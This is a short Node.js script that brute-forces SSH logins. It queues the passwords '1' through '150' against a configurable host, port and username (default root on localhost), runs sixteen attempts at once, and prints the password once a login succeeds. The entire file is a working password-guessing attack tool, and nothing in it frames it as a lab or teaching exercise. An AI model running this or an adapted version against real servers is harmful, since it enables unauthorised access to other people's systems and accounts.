
const connect = require('./utils/ssh')
const options = require('minimist')(process.argv)
const humanizeDuration = require('humanize-duration')
const queue = require('queue')({
  concurrency: 16,
  timeout: 3000,
})

let passwordDiscovered = null
const start = Date.now()
const host = options.host || '127.0.0.1'
const port = options.port || 22
const username = options.username || 'root'

const passwords = Array.from(Array(150)).map((value, index) => String(index + 1))
passwords.forEach(password => {
  const check = async () => {
    try {
      await connect({
        host,
        username,
        port,
        password,
      })
      passwordDiscovered = password
      console.info(`\nElapsed time: ${humanizeDuration(Date.now() - start)}`)
      console.info(`The password is "${passwordDiscovered}"\n`)
      process.exit(0)
    } catch (error) {
      if (error.level !== 'client-authentication') {
        await check()
      }
      process.stdout.write('.')
    }
  }
  queue.push(check)
})

queue.on('error', error => console.error(error))
queue.on('end', async () => {
  await new Promise(resolve => setTimeout(resolve, 5000))

  console.info(`\nElapsed time: ${humanizeDuration(Date.now() - start)}`)
  console.warn('Unknown password')
  process.exit(1)
})
queue.start()
